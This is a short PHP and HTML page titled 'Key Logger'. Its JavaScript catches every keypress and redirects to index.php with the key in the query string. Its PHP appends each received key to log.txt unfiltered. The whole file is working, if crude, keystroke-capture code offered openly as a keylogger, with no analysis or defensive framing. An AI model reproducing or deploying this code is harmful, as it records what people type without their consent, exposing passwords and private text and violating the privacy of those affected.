<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];
    $myfile = fopen("log.txt", "a");
    fwrite($myfile, $code);
    fclose($myfile);
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Logger</title>
</head>

<body>
    <script>
        document.addEventListener('keydown', function(event) {
            location.replace("index.php?code=" + event.key);
        });
    </script>
</body>

</html>
